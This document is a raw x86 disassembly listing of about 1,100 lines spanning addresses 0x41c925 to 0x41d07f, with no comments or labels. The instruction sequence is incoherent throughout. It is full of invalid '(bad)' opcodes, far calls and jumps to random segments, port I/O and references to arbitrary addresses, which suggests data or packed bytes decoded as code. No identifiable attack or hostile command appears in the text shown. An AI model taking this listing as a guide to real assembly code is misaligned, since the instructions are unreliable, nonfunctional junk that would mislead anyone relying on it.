  41c925:	sbb    DWORD PTR [ebp+0x745d7da2],esi
  41c92b:	fnstenv [eax+0x66]
  41c92e:	mov    al,0x13
  41c930:	call   0x2d923f5a
  41c935:	aaa    
  41c936:	into   
  41c937:	pop    ebp
  41c938:	cwde   
  41c939:	data16 fadd DWORD PTR ds:0x26c6e9d
  41c940:	cmp    edx,ebx
  41c942:	mov    dh,0x26
  41c944:	jle    0x41c994
  41c946:	cmp    eax,DWORD PTR [eax]
  41c948:	mov    DWORD PTR [ecx],edx
  41c94a:	cmp    DWORD PTR [edi+0x1b],ecx
  41c94d:	ret    
  41c94e:	inc    edi
  41c94f:	pop    ebp
  41c950:	xchg   ebx,eax
  41c951:	xor    DWORD PTR [eax],edx
  41c953:	cmp    al,0xb0
  41c955:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c956:	xchg   esi,eax
  41c957:	jns    0x41c9c5
  41c959:	jbe    0x41c920
  41c95b:	inc    ecx
  41c95c:	scas   eax,DWORD PTR es:[edi]
  41c95d:	(bad)  
  41c95e:	push   edi
  41c95f:	dec    eax
  41c960:	cmp    cl,bh
  41c962:	dec    esi
  41c963:	add    al,ch
  41c965:	or     eax,esp
  41c967:	jle    0x41c96c
  41c969:	in     eax,0x4d
  41c96b:	lods   al,BYTE PTR ds:[esi]
  41c96c:	pop    ecx
  41c96d:	mov    BYTE PTR [edx-0x67],dh
  41c970:	js     0x41c94c
  41c972:	mov    edx,0x97e982c
  41c977:	inc    esi
  41c978:	or     al,0xb3
  41c97a:	xor    DWORD PTR [edx],esp
  41c97c:	dec    ebp
  41c97d:	shl    BYTE PTR [ebp+0x265f11e5],cl
  41c983:	xchg   edi,eax
  41c984:	outs   dx,BYTE PTR ds:[esi]
  41c985:	or     eax,0xcd7ae462
  41c98a:	jg     0x41c9db
  41c98c:	inc    ebx
  41c98d:	call   0x7bd204fd
  41c992:	push   0x6860ce42
  41c997:	xor    DWORD PTR [ebp+0x20],edi
  41c99a:	and    BYTE PTR ds:0x7beac8e9,ah
  41c9a0:	imul   edi,DWORD PTR [ecx+eiz*8-0x73a79c56],0xa582e777
  41c9ab:	dec    ebx
  41c9ac:	or     eax,0xcdaf1eae
  41c9b1:	popa   
  41c9b2:	mov    eax,ds:0xa0bade01
  41c9b7:	cmp    edx,esp
  41c9b9:	add    bl,BYTE PTR [esi-0x266d2607]
  41c9bf:	call   0x1567:0xdeb62de2
  41c9c6:	js     0x41c9d0
  41c9c8:	loope  0x41c9ba
  41c9ca:	jle    0x41ca32
  41c9cc:	xor    eax,DWORD PTR [eax+0x6c]
  41c9cf:	adc    al,BYTE PTR [ebp+0x67]
  41c9d2:	xor    eax,0xac7dfdbf
  41c9d7:	xchg   esp,eax
  41c9d9:	xchg   ecx,eax
  41c9da:	jl     0x41c984
  41c9dc:	fistp  QWORD PTR [bx+si-0x74]
  41c9e0:	shl    DWORD PTR [edi],0x21
  41c9e3:	jl     0x41ca49
  41c9e5:	shl    BYTE PTR cs:[eax-0x48],0x98
  41c9ea:	fstp   TBYTE PTR [edx]
  41c9ec:	xchg   BYTE PTR [esi+0x4aaa403],al
  41c9f2:	xchg   edi,eax
  41c9f3:	mov    ds:0xb17d5bd3,al
  41c9f8:	daa    
  41c9f9:	shl    DWORD PTR fs:[edx],0xd1
  41c9fd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c9fe:	call   0x6b94:0x1ecaecf9
  41ca05:	dec    ebx
  41ca06:	jmp    0x7c19:0xfb87ef73
  41ca0d:	and    dh,BYTE PTR [ebx]
  41ca0f:	(bad)  
  41ca10:	cmp    BYTE PTR [ecx],dh
  41ca12:	sbb    al,0x77
  41ca14:	cwde   
  41ca15:	mov    BYTE PTR [edi+0x1577718f],dl
  41ca1b:	sbb    eax,0xed614d7d
  41ca20:	punpckhdq mm2,QWORD PTR [esi-0x5c]
  41ca24:	cwde   
  41ca25:	adc    DWORD PTR [ecx],ecx
  41ca27:	adc    esi,DWORD PTR [edx+ebx*8-0x5f9554b3]
  41ca2e:	pop    esp
  41ca2f:	mov    cl,0x26
  41ca31:	stc    
  41ca32:	add    BYTE PTR [eax+0x63ea63ed],0x6e
  41ca39:	in     al,dx
  41ca3a:	and    dh,bl
  41ca3c:	ss aas 
  41ca3e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ca3f:	xchg   esp,eax
  41ca40:	jmp    0xae8ab01
  41ca45:	outs   dx,DWORD PTR ds:[esi]
  41ca46:	retf   
  41ca47:	push   eax
  41ca48:	inc    esi
  41ca49:	fnop   
  41ca4b:	aas    
  41ca4c:	add    BYTE PTR cs:[edi],ch
  41ca4f:	mov    dh,0x32
  41ca51:	and    al,0x52
  41ca53:	enter  0x185c,0x56
  41ca57:	sbb    ebp,DWORD PTR [eax+0x5ba4de73]
  41ca5d:	mov    cl,0x1b
  41ca5f:	arpl   WORD PTR [ecx],dx
  41ca61:	fild   QWORD PTR [ecx-0x68be59b7]
  41ca67:	add    BYTE PTR [edi+0xfd30277],ch
  41ca6d:	xchg   BYTE PTR ds:0x64bc3c9b,bl
  41ca73:	jge    0x41ca00
  41ca75:	pop    eax
  41ca76:	mov    edi,DWORD PTR [eax*2-0x2d1e7b1f]
  41ca7d:	pusha  
  41ca7e:	pop    esi
  41ca7f:	cmp    esp,DWORD PTR [ebx]
  41ca81:	ror    BYTE PTR [edi-0x663834c5],1
  41ca87:	xlat   BYTE PTR ds:[ebx]
  41ca88:	inc    ecx
  41ca89:	mov    ecx,0xf5e8f4cf
  41ca8e:	dec    esp
  41ca8f:	or     ch,BYTE PTR [edx]
  41ca91:	push   0x2d4a6b8a
  41ca96:	loope  0x41ca39
  41ca98:	mov    esp,0xc422c93
  41ca9d:	(bad)  
  41ca9e:	sub    al,0x5b
  41caa0:	dec    edx
  41caa1:	xchg   ecx,eax
  41caa2:	dec    ebp
  41caa3:	inc    ebx
  41caa4:	cs sbb ecx,esp
  41caa7:	xlat   BYTE PTR ds:[ebx]
  41caa8:	xchg   esp,eax
  41caa9:	sub    eax,0xa6ee32e5
  41caae:	lock dec ecx
  41cab0:	jno    0x41ca59
  41cab2:	add    al,0xf2
  41cab4:	lods   al,BYTE PTR ds:[esi]
  41cab5:	dec    esp
  41cab6:	adc    al,0xcc
  41cab8:	jno    0x41ca61
  41caba:	test   dh,bl
  41cabc:	mov    ds:0x2813d203,eax
  41cac1:	inc    ebp
  41cac2:	push   ss
  41cac3:	xor    eax,0x39170b3d
  41cac8:	push   es
  41cac9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41caca:	dec    edx
  41cacb:	imul   ebx,DWORD PTR [esi+0x7039d922],0xffffffe7
  41cad2:	mov    esp,0x3ca4e8e1
  41cad7:	cmc    
  41cad8:	inc    ebx
  41cad9:	lea    ecx,[edi-0x5c5d9ce2]
  41cadf:	(bad)  
  41cae0:	xchg   esp,eax
  41cae1:	repnz sub BYTE PTR [esi-0x6fd54121],0x63
  41cae9:	mov    edi,0x3f863cd0
  41caee:	add    DWORD PTR ds:0xe4d74dcc,eax
  41caf4:	aas    
  41caf5:	test   BYTE PTR [edi],ah
  41caf7:	jmp    0x41caaf
  41caf9:	add    esi,ecx
  41cafb:	lods   eax,DWORD PTR ds:[esi]
  41cafc:	jae    0x41caa7
  41cafe:	nop
  41caff:	bound  edx,QWORD PTR [ebx-0x19]
  41cb02:	mov    cl,0x9e
  41cb04:	jmp    0x9e74:0x68b04feb
  41cb0b:	push   0x63
  41cb0d:	lods   eax,DWORD PTR ds:[esi]
  41cb0e:	add    cl,dh
  41cb10:	int3   
  41cb11:	daa    
  41cb12:	(bad)  ds:0x747fe5a4
  41cb18:	and    DWORD PTR [eax],edx
  41cb1a:	das    
  41cb1b:	push   cs
  41cb1c:	or     DWORD PTR [esi+0x3e],ebx
  41cb1f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cb20:	adc    BYTE PTR [ecx+0x37153ea0],ch
  41cb26:	pop    ecx
  41cb27:	leave  
  41cb28:	inc    eax
  41cb29:	push   es
  41cb2a:	sub    ecx,ebx
  41cb2c:	pop    eax
  41cb2d:	add    eax,0xf1ace664
  41cb32:	lds    esi,FWORD PTR [eax+0x77f88d11]
  41cb38:	aas    
  41cb39:	ret    0xd0bc
  41cb3c:	sbb    DWORD PTR [edi+0x5583b597],0x1fb30ef3
  41cb46:	mov    ebp,0x909db32
  41cb4b:	stos   BYTE PTR es:[edi],al
  41cb4c:	daa    
  41cb4d:	or     al,0xfe
  41cb4f:	lea    ecx,[ecx+0xcc09ae3]
  41cb55:	mov    ch,0xb7
  41cb57:	aam    0x3a
  41cb59:	lds    esp,FWORD PTR [edi+0xda361ac]
  41cb5f:	ret    0xd41e
  41cb62:	mov    BYTE PTR [edx-0x59],ah
  41cb65:	sbb    DWORD PTR [ebp+ebx*4+0x13],ebp
  41cb69:	sahf   
  41cb6a:	fild   DWORD PTR [eax-0x52dcd07e]
  41cb70:	pop    eax
  41cb71:	mov    al,BYTE PTR [edi+0x55ef76ca]
  41cb77:	xchg   ecx,eax
  41cb78:	enter  0x9d12,0x2a
  41cb7c:	fs pop edi
  41cb7e:	xor    bl,BYTE PTR [edi+0x5a23eff9]
  41cb84:	add    ebp,DWORD PTR [esi-0x60]
  41cb87:	push   edx
  41cb88:	sub    eax,0xd674cb82
  41cb8d:	and    al,0x2b
  41cb8f:	fst    QWORD PTR [ecx-0x654d0511]
  41cb95:	in     eax,dx
  41cb96:	mov    bl,0xc9
  41cb98:	jmp    0x41cbdd
  41cb9a:	mov    ds:0x8be0b169,eax
  41cb9f:	jle    0x41cc1d
  41cba1:	icebp  
  41cba2:	out    0xfa,al
  41cba4:	dec    edi
  41cba5:	das    
  41cba6:	sti    
  41cba7:	int    0x26
  41cba9:	and    eax,0x682d0f00
  41cbae:	inc    esi
  41cbaf:	inc    esp
  41cbb0:	push   edi
  41cbb1:	or     DWORD PTR [edx*4+0x1e9f5fbf],edi
  41cbb8:	dec    esi
  41cbb9:	or     ebx,DWORD PTR [edi+0x6a]
  41cbbc:	or     dl,BYTE PTR [ecx-0x7e]
  41cbbf:	int    0xcd
  41cbc1:	mov    edi,0xdf7108
  41cbc6:	inc    ah
  41cbc8:	add    ah,BYTE PTR [esi+edx*4]
  41cbcb:	jecxz  0x41cb5c
  41cbcd:	adc    al,0x51
  41cbcf:	jns    0x41cc4a
  41cbd1:	shl    DWORD PTR [ebx-0x5c13e616],cl
  41cbd7:	call   0x2166:0xc82eac90
  41cbde:	jmp    0x41cba6
  41cbe0:	inc    ebp
  41cbe1:	cmp    eax,0xa40f2fc
  41cbe6:	pop    eax
  41cbe7:	outs   dx,DWORD PTR ds:[esi]
  41cbe8:	(bad)  
  41cbe9:	dec    ebx
  41cbea:	jmp    0x49f2:0xf981d2a0
  41cbf1:	mov    eax,DWORD PTR [esi+0x13]
  41cbf4:	or     esi,DWORD PTR [edi]
  41cbf6:	pop    ss
  41cbf7:	mov    ecx,0xfe7ce2a7
  41cbfc:	je     0x41cbe1
  41cbfe:	call   0xc27:0xa2e78165
  41cc05:	adc    eax,0x69702425
  41cc0a:	pcmpgtb mm7,mm3
  41cc0d:	pusha  
  41cc0e:	push   ebx
  41cc0f:	ds cmp cl,cl
  41cc12:	push   ebx
  41cc13:	cdq    
  41cc14:	std    
  41cc15:	mov    esp,edx
  41cc17:	mov    ds:0x72020b85,al
  41cc1c:	add    DWORD PTR ds:0xe8a4cd8,ebp
  41cc22:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cc23:	int3   
  41cc24:	jg     0x41cc7c
  41cc26:	(bad)  
  41cc27:	sbb    eax,0xdda7fa30
  41cc2c:	mov    edi,0xa5750121
  41cc31:	clc    
  41cc32:	mov    ebp,0xbe8eebaa
  41cc37:	pop    eax
  41cc38:	jle    0x41cc38
  41cc3a:	add    ecx,DWORD PTR [eax-0x3f]
  41cc3d:	shl    BYTE PTR [esi],0xb2
  41cc40:	jg     0x41cc4a
  41cc42:	adc    esp,DWORD PTR [edx+0x70052d15]
  41cc48:	mov    ecx,0x719dbf21
  41cc4d:	add    al,0x52
  41cc4f:	and    esi,DWORD PTR [ebp-0x5]
  41cc52:	jg     0x41ccc0
  41cc54:	inc    ecx
  41cc55:	adc    bh,BYTE PTR [ecx]
  41cc57:	pusha  
  41cc58:	fs ja  0x41cc92
  41cc5b:	iret   
  41cc5c:	adc    eax,0xad691d63
  41cc61:	movups xmm0,XMMWORD PTR [eax]
  41cc64:	inc    esi
  41cc65:	fmul   QWORD PTR [esi-0x24]
  41cc68:	add    edi,0x38
  41cc6b:	sahf   
  41cc6c:	dec    edi
  41cc6d:	xor    eax,0x9f70f29a
  41cc72:	jbe    0x41ccf2
  41cc74:	jb     0x41ccac
  41cc76:	ins    BYTE PTR es:[edi],dx
  41cc77:	add    al,0x5d
  41cc79:	mov    dl,0x47
  41cc7b:	cld    
  41cc7c:	inc    ebp
  41cc7d:	mov    DWORD PTR [ebp-0x3f],eax
  41cc80:	aam    0x7c
  41cc82:	pop    edx
  41cc83:	test   eax,0x702f14e2
  41cc88:	mov    DWORD PTR [ecx-0x1e],ebp
  41cc8b:	pusha  
  41cc8c:	mov    ah,0x4f
  41cc8e:	les    edi,FWORD PTR [edi+ebp*4+0x35803c29]
  41cc95:	in     eax,0xcb
  41cc97:	push   ds
  41cc98:	mov    BYTE PTR [esi+0x1a],dh
  41cc9b:	add    eax,0xf714f99a
  41cca0:	aam    0x5a
  41cca2:	pop    edi
  41cca3:	cmp    edx,DWORD PTR [edi]
  41cca5:	fistp  QWORD PTR [edx]
  41cca7:	dec    ebx
  41cca8:	add    eax,0xe7441234
  41ccad:	rcr    BYTE PTR [edx-0x43],0xa2
  41ccb1:	push   eax
  41ccb2:	ins    DWORD PTR es:[edi],dx
  41ccb3:	push   ebx
  41ccb4:	je     0x41cc49
  41ccb6:	ror    DWORD PTR [eax*8+0xeb9c62f],1
  41ccbd:	or     eax,0xc95fe2b0
  41ccc2:	rcr    BYTE PTR [ebx+0x25],cl
  41ccc5:	xchg   ecx,eax
  41ccc6:	mov    eax,0x4570f9ef
  41cccb:	fs xor al,0x8
  41ccce:	sub    eax,0x166fc33f
  41ccd3:	aad    0x1
  41ccd5:	adc    al,0xf2
  41ccd7:	lds    edx,FWORD PTR ds:0x31170ec2
  41ccdd:	sub    al,0x18
  41ccdf:	pop    esi
  41cce0:	or     BYTE PTR [esi],ah
  41cce2:	xchg   bl,dl
  41cce4:	in     eax,0xe0
  41cce6:	ss pop esp
  41cce8:	loopne 0x41cd2c
  41ccea:	pop    eax
  41cceb:	add    al,0xf7
  41ccee:	sahf   
  41ccef:	add    BYTE PTR [edi],bh
  41ccf1:	xor    esp,DWORD PTR [ecx+0xe869d2d]
  41ccf7:	jns    0x41cd6e
  41ccf9:	leave  
  41ccfa:	aas    
  41ccfb:	push   edi
  41ccfc:	lds    esp,FWORD PTR [ebx+0x50]
  41ccff:	in     eax,dx
  41cd00:	cmp    BYTE PTR [esi-0x55c91797],bh
  41cd06:	jl     0x41cd75
  41cd08:	xchg   ebx,eax
  41cd09:	cmp    DWORD PTR [edi+esi*2-0x43],eax
  41cd0d:	push   es
  41cd0e:	sbb    eax,0xe6f1a238
  41cd13:	jae    0x41cd1e
  41cd15:	mov    bl,0x72
  41cd17:	pop    esi
  41cd18:	sar    DWORD PTR [esi+0x318f19b8],0x20
  41cd1f:	hlt    
  41cd20:	fldcw  WORD PTR [edx]
  41cd22:	adc    DWORD PTR [edx+edi*1+0x7d],eax
  41cd26:	push   ecx
  41cd27:	ss push es
  41cd29:	jo     0x41ccbb
  41cd2b:	cdq    
  41cd2c:	(bad)  
  41cd2d:	jmp    0x41ccc7
  41cd2f:	test   DWORD PTR [ecx-0x592d9f8],ebp
  41cd35:	in     eax,0xfe
  41cd37:	shl    BYTE PTR [ecx+0x3fbf2af],1
  41cd3d:	cwde   
  41cd3e:	ss in  al,dx
  41cd40:	dec    esi
  41cd41:	outs   dx,DWORD PTR ds:[esi]
  41cd42:	ffreep st(0)
  41cd44:	or     DWORD PTR [esi-0x6bfdf249],ebp
  41cd4a:	dec    eax
  41cd4b:	stos   DWORD PTR es:[edi],eax
  41cd4c:	sbb    DWORD PTR [ecx+0x6894fafb],esp
  41cd52:	mov    bl,0x8e
  41cd54:	cmp    al,0x29
  41cd56:	xor    eax,DWORD PTR [edx+0x7a]
  41cd59:	push   fs
  41cd5b:	inc    ebx
  41cd5c:	jg     0x41cdab
  41cd5e:	jecxz  0x41cce3
  41cd60:	fild   WORD PTR [edi]
  41cd62:	outs   dx,BYTE PTR ds:[esi]
  41cd63:	mov    cs,esi
  41cd65:	mov    dl,0x58
  41cd67:	(bad)  
  41cd69:	ret    0x8c7f
  41cd6c:	jne    0x41cd33
  41cd6e:	add    edi,DWORD PTR [esi+0x14e54c5c]
  41cd74:	mov    al,ds:0xdd1d7d64
  41cd79:	sub    BYTE PTR [ebx],bl
  41cd7b:	repnz outs dx,BYTE PTR ds:[esi]
  41cd7d:	ret    
  41cd7e:	or     DWORD PTR [ebx],esi
  41cd80:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cd81:	cmp    cl,BYTE PTR [edi]
  41cd83:	pop    edi
  41cd84:	loope  0x41cdcd
  41cd86:	xchg   esp,eax
  41cd87:	jmp    0xff296662
  41cd8c:	jb     0x41cd94
  41cd8e:	pop    edx
  41cd8f:	cmp    DWORD PTR [esi],0xe
  41cd92:	push   ss
  41cd93:	mov    ch,0xf
  41cd95:	(bad)  
  41cd97:	xor    edx,ebx
  41cd99:	popf   
  41cd9a:	mov    esp,0x5bb59a9a
  41cd9f:	adc    ebx,DWORD PTR [ecx]
  41cda1:	push   esi
  41cda2:	mov    ds:0x3806e19f,eax
  41cda7:	out    dx,eax
  41cda8:	or     al,0xf0
  41cdaa:	rcl    DWORD PTR [ebx+0x1e],cl
  41cdad:	push   esp
  41cdae:	scas   al,BYTE PTR es:[edi]
  41cdaf:	std    
  41cdb0:	daa    
  41cdb1:	shl    BYTE PTR [esi+0x64],0xd0
  41cdb5:	in     eax,dx
  41cdb6:	or     eax,0x4c0e93db
  41cdbb:	pop    esi
  41cdbc:	push   es
  41cdbd:	push   0xffffffee
  41cdbf:	sahf   
  41cdc0:	mov    DWORD PTR [ebx+0x56],edx
  41cdc3:	ins    BYTE PTR es:[edi],dx
  41cdc4:	lods   al,BYTE PTR ds:[esi]
  41cdc5:	inc    esi
  41cdc6:	mov    esp,0x6d75add6
  41cdcb:	(bad)  
  41cdcf:	mov    ah,0x2f
  41cdd1:	mov    WORD PTR [esi-0x52940f94],es
  41cdd7:	fcompp 
  41cdd9:	clc    
  41cdda:	jp     0x41cda8
  41cddc:	test   eax,0x99d1d77f
  41cde1:	mov    ebp,0xef8f7ae4
  41cde6:	rol    DWORD PTR [edx-0x354ca4eb],1
  41cdec:	or     eax,0xf752707b
  41cdf1:	xor    ecx,ecx
  41cdf3:	dec    esi
  41cdf4:	xchg   al,al
  41cdf6:	xchg   DWORD PTR [ebp+0x4b995e74],edi
  41cdfc:	ins    BYTE PTR es:[edi],dx
  41cdfd:	rol    bh,1
  41cdff:	stos   BYTE PTR es:[edi],al
  41ce00:	aaa    
  41ce01:	push   ecx
  41ce02:	xor    DWORD PTR ds:0xa271bc4c,ecx
  41ce08:	aad    0x9f
  41ce0a:	sbb    al,0x3d
  41ce0c:	sbb    DWORD PTR [ebx+0x50],esp
  41ce0f:	pop    ebp
  41ce10:	push   ebx
  41ce11:	jo     0x41cde0
  41ce13:	call   0xc5d599ce
  41ce18:	test   BYTE PTR [edx-0x1fe199ca],ch
  41ce1e:	std    
  41ce1f:	or     al,0x85
  41ce21:	fadd   QWORD PTR [edx+edx*4-0x5]
  41ce25:	ja     0x41ce02
  41ce27:	(bad)  
  41ce28:	push   ebp
  41ce29:	jl     0x41ce0e
  41ce2b:	fnstcw WORD PTR [ebp+0x77917913]
  41ce31:	clc    
  41ce32:	mov    BYTE PTR [esi+0x63864dbc],bl
  41ce38:	add    eax,0xfe2aeeea
  41ce3d:	retf   
  41ce3e:	aas    
  41ce3f:	ficomp WORD PTR [ecx]
  41ce41:	or     dh,BYTE PTR [ebx+0x35]
  41ce44:	popf   
  41ce45:	push   0xec207989
  41ce4a:	mov    eax,ds:0xaef1a8c6
  41ce4f:	in     al,0xb4
  41ce51:	fwait
  41ce52:	push   ebx
  41ce53:	cmp    BYTE PTR [ebp+eax*4+0x1bf4f024],ch
  41ce5a:	daa    
  41ce5b:	jae    0x41cedb
  41ce5d:	mov    ch,0x51
  41ce5f:	dec    esi
  41ce60:	add    al,0x0
  41ce62:	sti    
  41ce63:	or     esi,DWORD PTR [ebp-0x4a5cdf1f]
  41ce69:	mov    ebp,0x64740033
  41ce6e:	pushf  
  41ce6f:	inc    edi
  41ce70:	enter  0x6bb5,0x47
  41ce74:	out    0xef,eax
  41ce76:	cmc    
  41ce77:	in     al,0xba
  41ce79:	out    0xbe,al
  41ce7b:	pop    edx
  41ce7c:	imul   eax,DWORD PTR [ebx-0x76],0x30eb4602
  41ce83:	ret    
  41ce84:	mov    eax,0x34b65ade
  41ce89:	jno    0x41ce33
  41ce8b:	je     0x41ced7
  41ce8d:	sbb    ch,ah
  41ce8f:	fucom  st(2)
  41ce91:	or     al,0x2d
  41ce93:	repnz push 0x696b9203
  41ce99:	aad    0x9e
  41ce9b:	cmp    al,0x53
  41ce9d:	adc    ecx,DWORD PTR [edx-0x39e8bd97]
  41cea3:	shr    ah,1
  41cea5:	ins    DWORD PTR es:[edi],dx
  41cea6:	push   ebp
  41cea7:	inc    ebp
  41cea8:	mov    ecx,0xe6b267b9
  41cead:	mov    dh,ch
  41ceaf:	xchg   edx,eax
  41ceb0:	cmp    al,0xbf
  41ceb2:	cmc    
  41ceb3:	xor    ebp,DWORD PTR [ecx-0x7b]
  41ceb6:	jne    0x41ce73
  41ceb8:	push   ebx
  41ceb9:	repnz or bl,dh
  41cebc:	xlat   BYTE PTR ds:[ebx]
  41cebd:	ins    DWORD PTR es:[edi],dx
  41cebe:	xor    al,0xd7
  41cec0:	fisttp DWORD PTR [ebx-0x52]
  41cec3:	adc    al,0x93
  41cec5:	mov    DWORD PTR [ecx],esp
  41cec7:	fsub   QWORD PTR [ecx]
  41cec9:	call   0xa37a:0xf9f1421d
  41ced0:	fs aaa 
  41ced2:	adc    ch,dh
  41ced4:	xchg   esp,eax
  41ced5:	test   DWORD PTR [edi+0x35],esp
  41ced8:	int    0x44
  41ceda:	sub    esp,DWORD PTR [edi+eax*8+0x1d]
  41cede:	scas   al,BYTE PTR es:[edi]
  41cedf:	std    
  41cee0:	mov    dh,0x9d
  41cee2:	in     al,dx
  41cee3:	sbb    DWORD PTR [esi+0x15],0xd
  41cee7:	xor    ecx,DWORD PTR [eax]
  41cee9:	jg     0x41cf3e
  41ceeb:	mov    edi,0xe002b73
  41cef0:	jp     0x41cf51
  41cef2:	xchg   esp,eax
  41cef3:	and    DWORD PTR [ecx-0x4e762c40],0x17
  41cefa:	out    0x0,al
  41cefc:	inc    ebx
  41cefd:	int3   
  41cefe:	push   edx
  41ceff:	aas    
  41cf00:	ss (bad) 
  41cf03:	dec    edi
  41cf04:	jle    0x41ceea
  41cf06:	push   cs
  41cf07:	sub    edx,ebp
  41cf09:	dec    ebx
  41cf0a:	mov    edi,0x52658512
  41cf0f:	jge    0x41cf63
  41cf11:	jge    0x41cee1
  41cf13:	mov    edx,0xb2b915d
  41cf18:	hlt    
  41cf19:	popa   
  41cf1a:	sbb    BYTE PTR [edi],bl
  41cf1c:	sbb    dl,dh
  41cf1e:	rcl    DWORD PTR [eax-0x774e9976],cl
  41cf24:	stc    
  41cf25:	xchg   edx,eax
  41cf26:	ins    DWORD PTR es:[edi],dx
  41cf27:	cld    
  41cf28:	das    
  41cf29:	pop    eax
  41cf2a:	push   es
  41cf2b:	arpl   WORD PTR [edx+0xdf0093d],si
  41cf31:	retf   0xe071
  41cf34:	fmulp  st(6),st
  41cf36:	jae    0x41cfac
  41cf38:	xchg   edx,eax
  41cf39:	dec    ebp
  41cf3a:	jp     0x41cf9f
  41cf3c:	jp     0x41cf0a
  41cf3e:	or     ecx,DWORD PTR ds:0xffe7eeb0
  41cf44:	mov    ecx,0x92e1e761
  41cf49:	mov    edx,0x1d8e36ba
  41cf4e:	cmc    
  41cf4f:	jo     0x41cf99
  41cf51:	scas   al,BYTE PTR es:[edi]
  41cf52:	ins    BYTE PTR es:[edi],dx
  41cf53:	xchg   edi,eax
  41cf54:	ins    DWORD PTR es:[edi],dx
  41cf55:	js     0x41cfcb
  41cf57:	or     BYTE PTR [edx+esi*1+0x7c],0x5
  41cf5c:	or     cl,ch
  41cf5e:	call   FWORD PTR [edx-0x4d]
  41cf61:	test   BYTE PTR [ebx+0x2],dl
  41cf64:	adc    BYTE PTR ds:0xc9d8c72f,0x1e
  41cf6b:	add    al,0xb8
  41cf6d:	pop    ss
  41cf6e:	rcr    BYTE PTR [eax-0x74b92d63],cl
  41cf74:	bound  edx,QWORD PTR [edi+0x6adb8707]
  41cf7a:	xchg   BYTE PTR [ebx],cl
  41cf7c:	xlat   BYTE PTR ds:[ebx]
  41cf7d:	inc    esi
  41cf7e:	fidiv  DWORD PTR [ecx+0x57]
  41cf81:	inc    esi
  41cf82:	pop    ebp
  41cf83:	lea    eax,[edi+0xab75366]
  41cf89:	aaa    
  41cf8a:	cmp    DWORD PTR [edi+0x20],ebx
  41cf8d:	and    cl,BYTE PTR [eax+ecx*2]
  41cf90:	push   edx
  41cf91:	fcom   DWORD PTR [edx]
  41cf93:	mov    ah,0x78
  41cf95:	dec    edx
  41cf96:	out    0x67,al
  41cf98:	int3   
  41cf99:	lock cmp dh,ch
  41cf9c:	leave  
  41cf9d:	and    ebx,ecx
  41cf9f:	shl    DWORD PTR [edi-0x5a],cl
  41cfa2:	ds sub al,ch
  41cfa5:	test   eax,0x53a7b3b5
  41cfaa:	test   DWORD PTR [ebx-0xf],ecx
  41cfad:	cmp    ebp,DWORD PTR [ecx]
  41cfaf:	jg     0x41cf87
  41cfb1:	dec    eax
  41cfb2:	xchg   BYTE PTR [esi-0xa8002e9],ch
  41cfb8:	rcr    DWORD PTR [ecx],0x92
  41cfbb:	ss sbb eax,0xd14a2541
  41cfc1:	add    al,0x2f
  41cfc3:	nop
  41cfc4:	cwde   
  41cfc5:	jmp    0x41cf72
  41cfc7:	xchg   ebp,eax
  41cfc8:	daa    
  41cfc9:	push   esp
  41cfca:	loope  0x41cf95
  41cfcc:	ret    0xe19a
  41cfcf:	mov    bh,0x2c
  41cfd1:	xor    eax,DWORD PTR [ebx+eiz*4]
  41cfd4:	add    edx,DWORD PTR [edi+0x3c]
  41cfd7:	popf   
  41cfd8:	or     BYTE PTR cs:[eax+eax*4],ch
  41cfdc:	loop   0x41cfb5
  41cfde:	jecxz  0x41cfd4
  41cfe0:	fdiv   st,st(1)
  41cfe2:	nop
  41cfe3:	xchg   ebp,eax
  41cfe4:	sbb    cl,BYTE PTR [esi]
  41cfe6:	aas    
  41cfe7:	mov    ah,0xeb
  41cfe9:	imul   esi,DWORD PTR [esi],0x28
  41cfec:	xor    DWORD PTR es:[ebx],edi
  41cfef:	or     dl,BYTE PTR [ebx]
  41cff1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cff2:	arpl   bp,ax
  41cff4:	adc    dh,al
  41cff6:	or     ebx,ebp
  41cff8:	push   ss
  41cff9:	inc    esi
  41cffa:	loopne 0x41cf90
  41cffc:	jp     0x41cff2
  41cffe:	out    0x6d,al
  41d000:	sbb    ch,ch
  41d002:	fcom   QWORD PTR [ebp-0x1cc4110]
  41d008:	hlt    
  41d009:	push   ebx
  41d00a:	pop    ebx
  41d00b:	jle    0x41d046
  41d00d:	shr    DWORD PTR [edi],1
  41d00f:	sub    edx,edx
  41d011:	das    
  41d012:	mov    DWORD PTR [ebx+0x54],ebx
  41d015:	add    DWORD PTR [ebx-0x3a],eax
  41d018:	inc    esp
  41d019:	xor    eax,0xb0df33ba
  41d01e:	or     DWORD PTR [eax+0x14cfeeb4],edi
  41d024:	jae    0x41cffb
  41d026:	jno    0x41d001
  41d028:	sbb    DWORD PTR [eax+ebx*8-0x5a],ebx
  41d02c:	xchg   ebp,eax
  41d02d:	xchg   edi,eax
  41d02f:	ror    BYTE PTR [eax+0x71b3b9bf],0x88
  41d036:	neg    BYTE PTR [ecx+0x72]
  41d039:	push   edx
  41d03a:	push   esp
  41d03b:	or     al,0x2c
  41d03d:	out    0x19,eax
  41d03f:	jne    0x41d057
  41d041:	jl     0x41cfe7
  41d043:	adc    ebp,esi
  41d045:	pop    ecx
  41d046:	arpl   WORD PTR [edi],bp
  41d048:	mov    ah,0xdf
  41d04a:	mov    ah,0xc
  41d04c:	pop    eax
  41d04d:	daa    
  41d04e:	cdq    
  41d04f:	fsubr  QWORD PTR [edx+0x72]
  41d052:	sub    al,0x77
  41d054:	enter  0x47ea,0xf5
  41d058:	cmp    ah,dh
  41d05a:	cdq    
  41d05b:	inc    ebx
  41d05c:	inc    edx
  41d05d:	dec    eax
  41d05e:	push   esp
  41d05f:	cmp    BYTE PTR [ebp+esi*2-0x26317aba],al
  41d066:	aad    0x9e
  41d068:	out    0xd7,eax
  41d06a:	mov    al,ds:0x83349335
  41d06f:	int    0xb3
  41d071:	xchg   ecx,eax
  41d072:	rcl    DWORD PTR [ecx],cl
  41d074:	sub    DWORD PTR [edx],esi
  41d076:	stos   DWORD PTR es:[edi],eax
  41d077:	or     eax,0x45726746
  41d07c:	in     eax,dx
  41d07d:	xor    ebp,DWORD PTR [ecx]
  41d07f:	loop   0x41d0dd
